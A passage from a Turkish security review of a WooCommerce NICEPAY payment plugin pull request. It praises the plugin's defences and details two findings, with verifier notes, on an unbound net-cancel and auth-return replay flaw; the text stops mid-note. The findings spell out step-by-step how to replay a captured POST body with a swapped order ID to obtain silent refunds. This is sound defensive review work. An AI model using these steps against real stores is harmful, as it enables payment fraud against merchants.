# 03 — Güvenlik (AppSec)

> PR #3 sistematik review · düşmanca doğrulamalı · 23 bulgu

## Özet

Bu PR'ın güvenlik temeli gerçekten sağlam: her admin AJAX/POST aksiyonunda capability + nonce çifti var, tüm SQL `$wpdb->prepare` veya allowlist'lenmiş tanımlayıcılarla kuruluyor, çıktı kaçışı (esc_html/esc_attr/esc_url) sistematik, imza karşılaştırmaları istisnasız `hash_equals` ile yapılıyor, PG'den gelen `NextAppURL`/`NetCancelURL` katı bir host+path+port+şema allowlist'inden geçiyor, log'lar recursive redaksiyondan geçiyor, CSV formül enjeksiyonu engelleniyor ve PAN/CVV hiçbir yerde saklanmıyor. Klasik WordPress eklenti zafiyetlerinin (SQLi, yansıyan/depolanan XSS, eksik nonce, `is_admin()`'i yetki sanma, açık yönlendirme, deserialization) hiçbirinin sömürülebilir örneğini bulamadım. Bulunan sorunlar büyük ölçüde tasarım/sertleştirme katmanında: test modunun herkese açık NICEPAY sandbox kimlik bilgileriyle varsayılan olarak aktif olması ve sipariş yaşam döngüsünde canlı ödemeden ayırt edilememesi (bedava sipariş riski), kimliksiz `nicepay_init_payment` uç noktasının serbestçe üretilebilen nonce + fail-open transient rate-limit ile sınırsız defter satırı yaratabilmesi ve para hareketi yetkisinin `edit_shop_orders` yerine `manage_woocommerce`'a bağlanması. Bunların dışındakiler düşük etkili sertleştirme ve dayanıklılık maddeleri.

## Değerlendirme

| Ölçüt | Değer |
|---|---|
| Genel not | **B** |
| 🔴 Kritik | 1 |
| 🟠 Yüksek | 2 |
| 🟡 Orta | 7 |
| 🔵 Düşük | 11 |
| ⚪ Bilgi | 2 |
| Düşmanca doğrulamada elenen | 0 |
| Doğrulama sonrası severity düzeltilen | 1 |
| Bağımsız doğrulama kararı alan bulgu | 4 / 23 |
| Tarama geçişi | 2 |
| Referans verilen dosya | 10 |

## Güçlü yönler

- Tüm admin yazma aksiyonlarında capability + nonce çifti eksiksiz: `ajax_save_shortcode`/`ajax_delete_shortcode` (`manage_options` + `nicepay_admin_shortcodes`), `ajax_cancel_transaction` (`nicepay_cancel_{id}` işlem-özel nonce), `handle_csv_export` (`check_admin_referer` + cap). `wp_ajax_nopriv_` yalnızca gerçekten public olması gereken iki uç noktada.
- SSRF savunması örnek düzeyde: `NicePay_API::validate_nicepay_url()` (class-nicepay-api.php:178-200) şema=https, port=443, host allowlist (3 host), path allowlist (2 path) uyguluyor ve `user`/`pass`/`query`/`fragment` içeren URL'leri tamamen reddediyor; `request_args()` içinde `redirection => 0` ve `sslverify => true`.
- İmza/token karşılaştırmalarının tamamı `hash_equals` ile: `verify_auth_signature`, `verify_approval_signature`, `verify_cancel_signature`, `receipt_page()` order_key kontrolü (gateway:145), MID/Moid/tutar/currency/mode bağlamaları (inbound-validator:88,147,153,163).
- Hiçbir SQL enjeksiyon yolu yok. Dinamik tablo/kolon adları regex ile doğrulanıyor (`installer.php:80,94,241`, `transactions.php:100,138`), `IN (...)` listeleri `absint` map'lenmiş id'lerden veya `%d` placeholder dizisinden kuruluyor (`nicepay-functions.php:1123`, `retention.php:230`), `ORDER BY` allowlist'ten geliyor (`nicepay-functions.php:1233-1235`), LIKE için `esc_like` kullanılıyor.
- Sır sızıntısına karşı çok katmanlı savunma: merchant key admin formunda asla geri gösterilmiyor (`type=password value=""` + placeholder, admin.php:660,683), sistem raporu katı bir allowlist + `sanitize_report_value` ile üretiliyor, `nicepay_redact_log_data()` ayırıcı/büyük-küçük harf normalize ederek AuthToken/SignData/MerchantKey/PII anahtarlarını redakte ediyor, `nicepay_filter_payment_data()` PG yanıtından yalnız 22 alanı kalıcılaştırıyor.
- PAN/CVV hiçbir yerde saklanmıyor; `scrub_legacy_sensitive_data()` (installer.php:262-300) eski `card_no`, `auth_token` ve PAN/PII içeren `payment_data` blob'larını migrasyon öncesi temizliyor.
- CSV export'ta formül enjeksiyonu engeli (`sanitize_csv_cell`, transactions.php:226-236) — `\p{Z}` ve `\x00-\x20` öneklerini de kapsayan doğru regex —, satır limiti (10.000), keyset pagination ve `X-Content-Type-Options: nosniff`.
- Frontend ve admin JS'te tek bir `innerHTML`/`.html()`/`insertAdjacentHTML` kullanımı yok; tüm dinamik metin `textContent` ile yazılıyor (nicepay.js:113,181,230; nicepay-admin.js:22). Sunucudan gelen hata mesajları bile DOM'a metin olarak giriyor.
- Açık yönlendirme yok: ödeme akışındaki 10 yönlendirmenin tamamı `wp_safe_redirect` ve hedefler WooCommerce API'lerinden (`get_return_url`, `get_checkout_payment_url`, `wc_get_checkout_url`) türetiliyor; JS tarafında `sameOriginHttpsUrl()` guard'ı var (nicepay.js:18-25).
- Standalone makbuz token'ı 32 byte `random_bytes`, yalnızca SHA-256 hash'i saklanıyor, arama katı `/\A[0-9a-f]{64}\z/` regex'i ile ön-doğrulanıyor ve sayfa `nocache_headers` + `X-Robots-Tag: noindex` + `Referrer-Policy: no-referrer` + `X-Frame-Options: DENY` ile servis ediliyor.
- Return handler'lar POST-only, cache'lenemez ve iframe'lenemez; onay talebi öncesi atomik `pending -> approving` CAS (`nicepay_claim_transaction_for_approval`) replay'i kapatıyor.
- Tüm PHP dosyalarında (şablonlar dahil) `ABSPATH` guard'ı mevcut; `unserialize`/`eval`/`extract`/`shell_exec` kullanımı sıfır; release ZIP allowlist tabanlı (`build-release.sh`) olduğu için `tests/`, `vendor/`, `docs/analysis/`, `.github/` paketlenmiyor.
- CI workflow'ları SHA-pinned action'lar ve açık `permissions:` blokları kullanıyor; `pull_request_target` yok.
- SQL enjeksiyonu yüzeyi kapalı: NicePay_Transactions::FILTER_SQL sabit şekilli bir predikat ve istekten gelen her değer $wpdb->prepare ile bağlanıyor (admin/class-nicepay-transactions.php:17-21, 313-349); tablo adları regex ile doğrulanıyor (a.g.e. 100, 138); LIKE için esc_like (a.g.e. 332); IN (...) listeleri array_fill + %d ile kuruluyor (includes/nicepay-functions.php:1123-1132); ORDER BY sütunu allowlist'ten geliyor (includes/nicepay-functions.php:1233-1235).
- Zamanlama saldırılarına karşı tutarlı hash_equals kullanımı: imza doğrulamaları (includes/class-nicepay-api.php:113, 135, 157), kimlik/tutar bağlamaları (includes/class-nicepay-inbound-validator.php:88, 99, 153, 174), order_key doğrulaması (includes/class-nicepay-gateway.php:145) ve iade bağlamı (includes/class-nicepay-gateway.php:717-719, 732, 757, 834).
- Para aritmetiği tamamen tamsayı-string üzerinde yapılıyor, float'a hiç düşülmüyor (includes/nicepay-functions.php:1462-1647) ve wpdb formatı decimal sütunlar için %s (includes/class-nicepay-transaction-schema.php:237-247).
- XSS: echo edilen her değişken esc_html/esc_attr/esc_url/esc_textarea ile kaçırılmış; unescaped echo taraması yalnızca sabit stringli ternary'ler döndürdü. JS tarafında hiç innerHTML/append(string) yok — tüm dinamik metin createElement + textContent ile yazılıyor (assets/js/nicepay.js:104-116, 170-193; assets/js/nicepay-admin.js:16-25).
- SSRF için şema+host+path+port allowlist'i, kullanıcı/parola/query/fragment reddi (includes/class-nicepay-api.php:178-200), redirection => 0 ve sslverify => true (a.g.e. 215-224), ayrıca bağımsız connect timeout (a.g.e. 241-275).
- CSV export: sütun allowlist'i PII ve kimlik bilgisi içermiyor, formül enjeksiyonu ' öneki ile engelleniyor (admin/class-nicepay-transactions.php:226-236), cursor tabanlı sayfalama ve sert satır limiti var (a.g.e. 128-218); nonce + yetki kontrolü mevcut (a.g.e. 241-255).
- Yarış koşullarına karşı veritabanı seviyesinde atomik claim'ler: UNIQUE active_attempt_key ile pending->approving geçişi (includes/nicepay-functions.php:653-709) ve UNIQUE cancel_moid ile iade rezervasyonu (a.g.e. 719-755).
- Mass-assignment koruması: NicePay_Transaction_Schema::prepare_write PG kaynaklı payload'lardan gelen bilinmeyen sütunları düşürüyor ve id/created_at/updated_at'i DB'ye bırakıyor (includes/class-nicepay-transaction-schema.php:257-275).
- Log güvenliği: anahtar adı normalize edilerek redaksiyon (includes/nicepay-functions.php:55-84), CR/LF temizliği ile log injection engeli (a.g.e. 25, 32, 83), ve yanıt gövdesi için allowlist (a.g.e. 95-116). PAN/CVV hiçbir yerde saklanmıyor.
- Migrasyonda eski sürümlerin bıraktığı hassas verinin temizlenmesi (includes/class-nicepay-installer.php:262-300) ve UNIQUE index eklemeden önce fail-closed duplicate kontrolü (a.g.e. 138-167).
- Makbuz token'ı 32 rastgele bayt, yalnızca SHA-256 özeti saklanıyor, katı hex regex ile doğrulanıyor (includes/nicepay-functions.php:1052-1107); makbuz ve return sayfalarında nocache + X-Robots-Tag + Referrer-Policy + X-Frame-Options: DENY (nicepay-payment-gateway.php:375-380; includes/class-nicepay-return-handler.php:26-31).
- Tüm yönlendirmeler wp_safe_redirect ile yapılıyor; JS tarafında hedef URL'ler same-origin + HTTPS zorunluluğuna tabi (assets/js/nicepay.js:18-25, 248-251, 495).
- unserialize / eval / extract / $_REQUEST kullanımı hiç yok; tüm superglobal erişimleri isset + wp_unslash + sanitize üzerinden; tüm PHP dosyalarında ABSPATH guard mevcut.
- Merchant key alanı type=password, değer asla tekrar render edilmiyor, ayrı bir 'temizle' onay kutusu var (admin/class-nicepay-admin.php:658-691).

## Bulgular

### SEC-011 — Net cancel (ters çevirme) saldırganın POST ettiği TxTid/AuthToken/NetCancelURL ile yapılıyor: aynı MID'e ait keyfi bir yetkilendirmeyi iptal ettiren oracle

| | |
|---|---|
| **Severity** | 🔴 Kritik |
| **Kategori** | broken-authorization-binding |
| **Konum** | [includes/nicepay-functions.php:238](../../../includes/nicepay-functions.php#L238) |
| **Güven** | high |
| **Doğrulama** | ⚠️ 1 doğrulandı, 1 kısmen |

**Sorun ve kanıt**

```php
nicepay_abort_authenticated_payment() ters çevirme bağlamını hiç doğrulamadan doğrudan çağıranın verdiği diziden alıyor: `function nicepay_abort_authenticated_payment( $transaction_id, array $auth_data, $api, $reason ) { $requested_at = gmdate( 'Y-m-d H:i:s' ); $net_cancel = $api->request_net_cancel( $auth_data );` (nicepay-functions.php:236-238). Bu $auth_data, class-nicepay-gateway.php:408-419'da doğrudan $_POST'tan kuruluyor: 'AuthToken' => $auth_token, 'TxTid' => $tx_tid, 'NetCancelURL' => $net_cancel_url. NicePay_API::request_net_cancel() ise yalnızca alanların dolu olduğunu ve URL'in allowlist'te olduğunu kontrol ediyor (class-nicepay-api.php:472-488) — $auth_data['TxTid'] ile iptal edilen transaction satırının kendi tid'i arasında HİÇBİR karşılaştırma yok. Yanıt doğrulaması bile saldırganın verdiği değerlere göre yapılıyor: `if ( ! hash_equals( $auth_data['TxTid'], (string) $result['TID'] ) ... )` (class-nicepay-api.php:537-541), yani kendi kendini doğruluyor. Aynı bağlanmamış $auth_data, imza doğrulaması ve claim'den sonraki BEŞ ayrı abort yolunda kullanılıyor (gateway:447, 465, 493, 551, 607).
```

**Başarısızlık senaryosu**

1) Saldırgan 10.000 KRW'lik Sipariş A'yı normal şekilde öder; tarayıcının ReturnURL'e yaptığı POST gövdesini (AuthToken_A, TxTid_A, Amt=10000, Signature_A, NetCancelURL) devtools'tan kopyalar. Sipariş A 'processing' olur. 2) Saldırgan önceden hazırladığı, aynı 10.000 KRW tutarlı Sipariş B'nin receipt sayfasından Moid_B'yi okur (templates/payment-form.php:59'da gizli input olarak basılıyor). 3) Aynı POST gövdesini sadece Moid=Moid_B yaparak wc-api/nicepay_return'e tekrar gönderir. İmza AuthToken+MID+Amt üzerinden hesaplandığı için hâlâ geçerlidir (class-nicepay-api.php:107-114) ve validate_auth_return Moid_B satırını bulup tüm kontrollerden geçirir. 4) claim başarılı olur, ardından `nicepay_update_transaction( $transaction->id, array('tid'=>$tx_tid,'auth_token'=>$auth_token), true )` (gateway:461-464) uniq_tid UNIQUE index'ini (schema:127) ihlal eder ve false döner. 5) gateway:465 nicepay_abort_authenticated_payment'i çağırır; bu da Sipariş A'nın TxTid_A/AuthToken_A'sı ile net cancel gönderir. NICEPAY net-cancel penceresi içinde bunu kabul ederse Sipariş A'nın parası geri döner, ama Sipariş A hâlâ ödenmiş görünür. Pencere kapalıysa bile Sipariş B kalıcı olarak 'on-hold' + 'needs_reconciliation' olur ve tekrar ödenemez.

**Etki**

Aynı MID altında geçerli bir auth-return yakalayan herhangi bir alışverişçi, o yetkilendirmenin (yani BAŞKA bir siparişin) NICEPAY tarafındaki tahsilatını sunucuya iptal ettirebiliyor. İptal edilen sipariş WooCommerce'te 'processing/completed' ve ledger'da status='paid', remaining_amount=tam tutar olarak kalıyor; hiçbir yeniden kontrol yok. Net cancel başarılı dönerse ($unknown === false) transaction 'failed' + reconciliation_status='not_required' işaretleniyor (nicepay-functions.php:250-252), yani uyarı bile üretilmiyor — saldırı tamamen sessiz. Bu, mal bedeli tahsil edilmeden sipariş sevkiyatına yol açar.

**Öneri**

Ters çevirme bağlamını asla istekten kurma; claim'den sonra kalıcılaştırılmış satırdan kur. Somut olarak: (a) request_net_cancel'a transaction satırını da geçir ve gönderimden önce `hash_equals( (string) $transaction->tid, (string) $auth_data['TxTid'] )` doğrula, aksi halde WP_Error ile fail-closed dön; (b) claim'den ÖNCE gelen TxTid'in ledger'da başka bir satırda kayıtlı olup olmadığını sorgula (`SELECT id FROM ... WHERE tid = %s`) ve varsa isteği 'nicepay_inbound_replay' olarak reddet — claim etme, net cancel gönderme, reconciliation bayrağı kaldırma; (c) approval isteği HİÇ gönderilmemiş hataları (tid çakışması, sipariş bulunamadı, snapshot değişti) 'para durumu bilinmiyor' sınıfından ayır ve bunlarda net cancel'ı yalnızca satırın kendi tid'i ile yap; (d) status='paid' olan bir TID için gelen net cancel talebini kesin olarak reddet.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `confirmed`)

- Gerekçe: İddianın her teknik unsurunu kodu açıp doğruladım; satır numaraları dosyaların şu anki haliyle birebir eşleşiyor.

1) Ters çevirme bağlamı gerçekten bağlanmamış. `nicepay_abort_authenticated_payment()` (nicepay-functions.php:236-238) `$auth_data`'yı olduğu gibi `request_net_cancel()`'a veriyor; fonksiyon imzasında transaction satırı yok, içeride `nicepay_get_transaction()` çağrısı da yok — yalnızca `$transaction_id` ile UPDATE yapılıyor (247-263). Yani gönderilen `TID` ile güncellenen satır arasında hiçbir bağ kurulmuyor.

2) `$auth_data` doğrudan `$_POST`'tan kuruluyor: gateway:397-419 ve return-handler:44-71. TxTid/AuthToken/NetCancelURL saldırganın kontrolünde.

3) `request_net_cancel()` (api:471-548) yalnızca (a) 4 alanın dolu string olması, (b) `validate_nicepay_url()` allowlist'i kontrol ediyor. Ledger'daki `tid` ile karşılaştırma YOK. Yanıt doğrulaması `hash_equals( $auth_data['TxTid'], (string) $result['TID'] )` (api:537) — yani saldırganın verdiği değere karşı; kendi kendini doğruluyor. İddia burada tamamen doğru.

4) Üst katmanda çürütücü bir koruma ARADIM, YOK. `NicePay_Inbound_Validator::validate_auth_return()` (inbound-validator:31-116) şunları kontrol ediyor: flow, moid ile satır bulma, status/approval_state='pending', offer_expires_at, MID, currency, Amt, PayMethod, AuthResultCode, imza. TxTid ile ilgili TEK kontrol `first_missing_field` içindeki "boş olmasın" kontrolü (satır 43). Gelen TxTid'in başka bir satırda kayıtlı olup olmadığına dair sorgu yok — `nicepay_get_transaction_by_tid()` yalnızca 4 yerde kullanılıyor (functions:1010, admin:1140, gateway:702) ve hiçbiri inbound auth yolunda değil.

5) İmza gerçekten Moid/TxTid'e bağlanmıyor: `verify_auth_signature()` = `sha256(AuthToken + MID + Amt + merchant_key)` (api:107-114). Dolayısıyla aynı tutarlı farklı bir Moid ile replay imzayı geçersiz kılmıyor — cross-order replay mekaniği doğrulandı.

6) Başarısızlık senaryosunun 4. adımı da geçerli: şema `'tid' => 'varchar(50) DEFAULT NULL'` (schema:45) + `'UNIQUE KEY uniq_tid (tid)'` (schema:127). NULL'lar unique index'i tetiklemediği için pending satırlar sorunsuz; ama zaten kullanılmış bir TxTid'i ikinci satıra yazmak duplicate-key hatası veriyor, `$wpdb->update` false dönüyor, `nicepay_update_transaction` (functions:412-429) false dönüyor ve gateway:465 / return-handler:97 abort yoluna giriliyor — net cancel saldırganın TxTid_A'sı ile gidiyor. `prepare_write` (schema:257-275) 'tid'i filtrelemiyor (format_for('tid') mevcut), yani alan gerçekten UPDATE'e giriyor.

7) Sessizlik iddiası da doğru: net cancel başarılıysa `$unknown === false` → `reconciliation_status => 'not_required'` (functions:252) ve kayıt Sipariş B'nin satırına yazılıyor; Sipariş A'nın satırına hiç dokunulmuyor, hiçbir yeniden doğrulama tetiklenmiyor.

Ek olarak iddiada listelenmemiş 7. bir bağlanmamış çağrı yeri buldum: `NicePay_API::abort_approval()` (api:417-435) da `request_net_cancel( $auth_data )` çağırıyor. Bu, senaryoyu daha da kolaylaştırıyor: replay edilen approval isteği NICEPAY tarafında "zaten onaylı" hatası verirse, kod TxTid_A ile net cancel'ı doğrudan API katmanında gönderiyor — UNIQUE index çakışmasına bile gerek kalmıyor.

Küçük nüans (severity'yi değiştirmiyor): başlıktaki "aynı MID'e ait keyfi bir yetkilendirme" ifadesi biraz geniş — saldırgan başka bir alışverişçinin AuthToken'ı için geçerli Signature üretemez, yalnızca kendi gözlemleyebildiği (yani kendi geçmiş) auth-return'ünü replay edebilir. Fakat bu bile "kendi ödediğim siparişin parasını geri al, sipariş 'processing'/'paid' kalsın" demek olduğundan etki critical seviyesinde kalıyor. Ayrıca paranın fiilen geri dönmesi NICEPAY'in net-cancel penceresini kabul etmesine bağlı (koddan doğrulanamaz); pencere kapalı olsa bile Sipariş B kalıcı 'on-hold'/'needs_reconciliation' olarak kilitleniyor. Yetkilendirme-bağlama kusuru her iki durumda da gerçek.

**Doğrulayıcı notu** (lens: `sonuc-ve-istismar`, karar: `partially-confirmed`)

- Düzeltilmiş iddia: Net cancel (망취소) bağlamı — TID, AuthToken ve NetCancelURL — tamamen istemcinin POST'undan alınıyor ve ters çevirilen transaction satırının kendi `tid`'i ile hiçbir noktada karşılaştırılmıyor (nicepay-functions.php:238; validator'da TxTid için tek bir bağlama kontrolü yok; api.php:537'deki tek hash_equals saldırganın kendi girdisini yanıtın echo'suna karşı doğruluyor). Aynı bağlanmamış $auth_data ALTI ters çevirme yolunda kullanılıyor: gateway:447/465/493/551/607, return-handler:97/149/194 ve api.php:435 (abort_approval).

Gerçekçi istismar, müşteriler-arası hedefleme DEĞİL, saldırganın kendi iki siparişiyle yaptığı sessiz iade dolandırıcılığıdır: Moid 64 bit rastgele üretildiği için (api.php:91 `bin2hex(random_bytes(8))`) yabancı bir siparişin Moid'i tahmin edilemez. Saldırgan aynı tutar/PayMethod'lu ikinci bir pending sipariş (B) hazırlar, ödediği Sipariş A'nın auth-return POST gövdesini Moid=Moid_B ile kimlik doğrulamasız ve rate-limit'siz /?wc-api=nicepay_return'e replay eder (imza AuthToken+MID+Amt üzerinden hesaplandığı için Moid değişimi imzayı bozmaz, api.php:111). uniq_tid UNIQUE index'i (schema:127; tid NULL'lanabilir olduğu için index canlı) B satırına TxTid_A yazılmasını engeller, nicepay_update_transaction false döner (functions:420) ve gateway:465 Sipariş A'nın TxTid/AuthToken'ı ile net cancel gönderir. A satırı 'paid' ve WC siparişi 'processing' kalır, B satırı 'failed'/'not_required' işaretlenir — hiçbir mutabakat uyarısı üretilmez. NICEPAY'in 망취소 penceresi açıkken (saldırgan iki isteği paralel atarak bunu garantileyebilir) para geri döner ve mal bedelsiz sevk edilir; pencere kapalıysa etki saldırganın kendi B siparişinin kalıcı 'on-hold' olmasıyla sınırlı kalır.
- Gerekçe: ÇEKİRDEK İDDİA DOĞRU VE İSTİSMAR EDİLEBİLİR. Çürütmek için üç kırılma noktası aradım; üçü de tutmadı:

(1) "Belki validate_auth_return TxTid'i satıra bağlıyordur." — HAYIR. class-nicepay-inbound-validator.php:31-116'daki tüm kontrolleri okudum: flow, status/approval_state='pending', offer_expires_at, MID, currency, Amt, PayMethod, AuthResultCode, Signature. TxTid HİÇ kontrol edilmiyor. Tüm repo'da TxTid ile yapılan tek hash_equals, api.php:537'deki kendi kendini doğrulayan karşılaştırma (`grep -rn "TxTid" includes/ | grep hash_equals` → tek satır).

(2) "Belki imza Moid'i bağlıyordur, Moid-swap replay imzada patlar." — HAYIR. api.php:107-114 `$plain = $auth_token . $this->mid . $amt . $this->merchant_key;`. Moid ve TxTid imza girdisinde yok. Aynı MID + aynı Amt olan her Moid için imza geçerli kalır.

(3) "Belki uniq_tid pratikte çalışmıyordur (pending satırlar tid='' ile çakışır, index ölü olur)." — HAYIR, index CANLI. schema:45 `'tid' => 'varchar(50) DEFAULT NULL'` — MySQL UNIQUE, NULL'ları hariç tutar; yani çok sayıda pending satır (tid=NULL) sorunsuz durur, ama iki satır aynı somut TID'i taşıyamaz. schema:127 `UNIQUE KEY uniq_tid (tid)`. Dolayısıyla iddianın 4. adımındaki çakışma yolu gerçekten tetiklenir: $wpdb->update duplicate-key'de false döner, nicepay_update_transaction (functions:412-420, $require_change=true → `1 === (int) $result`) false döner ve gateway:465 abort'a düşülür.

Ulaşılabilirlik: endpoint kimlik doğrulamasız public (gateway.php:36 `add_action('woocommerce_api_nicepay_return', ...)`), nonce yok, rate-limit yok — nicepay_check_public_rate_limit() tanımlı (functions:286) ama repo genelinde HİÇBİR yerden çağrılmıyor (grep ile doğruladım). Tek ön koşul POST metodu (gateway:387).

Somut istismar adımları (üretilebilir):
- Saldırgan kendi Sipariş B'sini oluşturur, ödeme formunu açar → pending transaction satırı + Moid_B, payment-form.php:58-59'da gizli input olarak (form_data'da 'Moid' → gateway:334) tarayıcıda görünür. Ödemez; offer_expires_at içinde tutar.
- Aynı tutar/PayMethod ile Sipariş A'yı normal öder; ReturnURL'e giden POST gövdesini (AuthToken_A, TxTid_A, Amt, Signature_A, NetCancelURL) alır.
- Aynı gövdeyi Moid=Moid_B ile POST /?wc-api=nicepay_return'e gönderir. validate_auth_return B satırını bulur, tüm kontroller geçer (imza Moid'e bağlı değil), claim başarılı olur, gateway:461 tid=TxTid_A yazmayı dener → uniq_tid ihlali → false → gateway:465 nicepay_abort_authenticated_payment($transaction_id=B, $auth_data=A'nın verisi) → functions:238 `$api->request_net_cancel($auth_data)` → NICEPAY'e TID=TxTid_A, AuthToken=AuthToken_A ile 망취소 gider.
- Zamanlama gerçekçi: saldırgan iki POST'u paralel/saniyeler içinde atabildiği için net-cancel penceresi açıkken vurulur. Zaten kodun kendi tasarımı (gateway:607, capture BAŞARILI olduktan sonra net cancel atıyor) "net cancel onaylanmış bir ödemeyi geri alır" varsayımına dayanıyor — saldırgan tam olarak bu varsayılan yeteneği kullanıyor.
- Sonuç: A satırına hiç dokunulmaz (status='paid', remaining_amount=tam tutar, WC sipariş 'processing'), B satırı 'failed' + reconciliation_status='not_required' (functions:250-252) → hiçbir uyarı üretilmez. Tamamen sessiz; mal bedeli tahsil edilmeden sevk edilir.

DÜZELTİLMESİ GEREKEN DETAY (bu yüzden 'confirmed' değil 'partially-confirmed'): "Aynı MID altında ... BAŞKA bir siparişin" ifadesi, saldırganın rastgele bir kurbanın yetkilendirmesini hedefleyebildiğini ima ediyor. Bu kısım gerçekçi DEĞİL: Moid, api.php:82-91'de `$prefix . '_' . edi_date . '_' . bin2hex(random_bytes(8))` ile üretiliyor (64 bit entropi) ve schema:125 uniq_moid ile tekil; saldırgan başka bir müşterinin Moid'ini tahmin edemez veya numaralandıramaz. Ayrıca kurbanın satırı 'pending' + süresi dolmamış olmalı. Yani gerçekçi senaryo, saldırganın KENDİ iki siparişi ile yaptığı self-service iade dolandırıcılığıdır — hedeflenmiş müşteriler-arası iptal değil. Bu, etkiyi düşürmez (bedava mal + sessiz para kaybı) ama saldırı yüzeyini daraltır. İkincil düzeltme: adım 2'de "Sipariş B'nin receipt sayfası" değil, ödeme formu (payment-form.php:58-59) doğru konumdur — iddia zaten doğru satırı da veriyor.

Severity: 'critical' abartılı değil. Kimlik doğrulamasız, rate-limit'siz, sessiz, para kaybettiren ve hiçbir mutabakat bayrağı üretmeyen bir yol. Tek dış bağımlılık NICEPAY'in onaylanmış bir TID için 망취소'yu kabul etme penceresidir; kabul etmezse fallback saldırganın kendi B siparişinin kalıcı 'on-hold' olması (kendine zarar, düşük etki). Bu dış belirsizliğe rağmen tasarım kusuru — ters çevirme bağlamının istekten kurulması — tek başına critical'dır, çünkü aynı bağlanmamış $auth_data BEŞ ayrı abort yolunda (gateway:447/465/493/551/607) ve standalone akışında da (return-handler:97/149/194) kullanılıyor; ayrıca api.php:417-463 abort_approval() de aynı bağlanmamış diziyi kullanıyor — iddiada listelenmemiş EK bir çağrı yolu.

Önerilen düzeltmeler (a)-(d) doğru ve uygulanabilir. (b) maddesi (claim'den ÖNCE `SELECT id FROM ... WHERE tid = %s` ile gelen TxTid'in başka satırda olup olmadığını kontrol) tek başına bu somut senaryoyu kapatır ve fail-closed'dur.

---

### SEC-012 — Auth-return imzası Moid/TxTid'e bağlanmıyor; ReqReserved ve binding_token_hash tasarlanmış ama hiç bağlanmamış (replay + Moid ikamesi)

| | |
|---|---|
| **Severity** | 🟠 Yüksek |
| **Kategori** | replay-protection |
| **Konum** | [includes/class-nicepay-inbound-validator.php:111](../../../includes/class-nicepay-inbound-validator.php#L111) |
| **Güven** | high |
| **Doğrulama** | ⚠️ 1 doğrulandı, 1 kısmen |

**Sorun ve kanıt**

```php
Auth dönüşünün imzası yalnızca AuthToken+MID+Amt+MerchantKey üzerinden hesaplanıyor: `$plain = $auth_token . $this->mid . $amt . $this->merchant_key;` (class-nicepay-api.php:111). validate_auth_return ise işlemi tamamen POST'tan gelen Moid ile buluyor (`$moid = $payload['Moid']; $transaction = nicepay_get_transaction_by_moid( $moid, $flow );` — inbound-validator:57-58) ve sonrasında yalnızca MID, currency, Amt, PayMethod ve imzayı kontrol ediyor (a.g.e. 85-113). Yani (AuthToken, Amt, Signature) üçlüsü aynı MID'in HERHANGİ bir bekleyen ve aynı tutarlı denemesine yapıştırılabiliyor. Bu bağlamayı sağlaması gereken iki mekanizma kodda mevcut ama ölü: `$req_reserved = isset( $_POST['ReqReserved'] ) ? sanitize_text_field( wp_unslash( $_POST['ReqReserved'] ) ) : '';` (gateway:406) değişkeni bir daha hiç kullanılmıyor (repo genelinde tek eşleşme), ve `'binding_token_hash' => self::COLUMN_CHAR_64` (schema:55) sütunu hiçbir yerde yazılmıyor/okunmuyor. Ayrıca imzanın zaman damgası olmadığı için eski bir payload süresiz olarak geçerli kalıyor.
```

**Başarısızlık senaryosu**

Saldırgan aynı tutarlı iki sipariş oluşturur. Sipariş A'yı öder ve tarayıcının ReturnURL POST gövdesini saklar. Sipariş B'nin receipt sayfasını açıp Moid_B'yi okur. Sakladığı gövdeyi yalnızca Moid alanını Moid_B yaparak tekrar gönderir. inbound-validator tüm kontrollerden geçirir (flow eşleşir, status pending, offer_expires_at 30 dk, MID eşleşir, currency KRW, Amt eşleşir, PayMethod allowed_methods içinde, AuthResultCode 0000, imza geçerli) ve satırı döndürür. Sipariş B kalıcı olarak on-hold'a düşer; işlem needs_reconciliation olur. Saldırgan bunu istediği kadar tekrarlayabilir; her tekrar için tek maliyeti yeni bir sipariş oluşturmaktır.

**Etki**

Süresi dolmayan bir imza + tahmin edilemez ama sahibine görünür bir Moid, yeniden oynatma (replay) ve işlem ikamesi saldırılarının kapısını açıyor. Doğrudan sonucu: kurban deneme 'approving'e çekilip ardından 'needs_reconciliation' + sipariş 'on-hold' oluyor; sipariş needs_payment() false döndüğü için müşteri tekrar ödeyemiyor. Dolaylı ama daha ağır sonucu SEC-001: net cancel oracle'ının tetiklenmesi. Ek olarak, sahte 'manual reconciliation required' alarmlarının sınırsız üretilebilmesi (nicepay_get_reconciliation_count, nicepay-functions.php:1032-1043) eklentinin tüm para güvenliği sinyalini gürültüye boğuyor ve alarm yorgunluğu yaratıyor.

**Öneri**

Her ödeme denemesi için sunucu tarafında rastgele bir bağlama nonce'u üret, SHA-256 özetini binding_token_hash sütununa yaz ve düz halini ReqReserved (WooCommerce) / MallReserved alanıyla NICEPAY penceresine gönder. Dönüşte `hash_equals( $transaction->binding_token_hash, hash( 'sha256', $payload['ReqReserved'] ) )` doğrulaması yapılmadan hiçbir claim alınmasın. Ayrıca: (a) gelen TxTid ledger'da zaten varsa isteği yan etkisiz biçimde reddet; (b) edi_date/offer_expires_at ile birlikte imzalı payload'a bir tazelik penceresi uygula; (c) MID+Amt+AuthToken kombinasyonu için idempotency anahtarı tutup aynı üçlünün ikinci kez işlenmesini engelle.

**Doğrulayıcı notu** (lens: `sonuc-ve-istismar`, karar: `partially-confirmed`)

- Severity düzeltmesi: `high` → `medium`
- Düzeltilmiş iddia: Doğrulanan çekirdek: auth-return imzası yalnızca AuthToken+MID+Amt+MerchantKey üzerinden hesaplanıyor (api:107-114); işlem kimliği tamamen imzasız POST `Moid` alanından çözülüyor (inbound-validator:57-58) ve tazelik/idempotency kontrolü yok. `ReqReserved` (gateway:406) ve `binding_token_hash` (schema:55) gerçekten ölü. Dolayısıyla saldırgan, KENDİ tarayıcısında yakaladığı geçerli bir (AuthToken, Amt, Signature) üçlüsünü, aynı MID+aynı tutar+aynı yöntemdeki BAŞKA bir bekleyen Moid'e yapıştırıp validate_auth_return'ün tüm kapılarından geçebiliyor; sonuç ilgili siparişin kalıcı `on-hold` + işlemin `needs_reconciliation` olması (gateway:552-562, functions:213-225).

Düzeltilmesi gereken üç nokta:
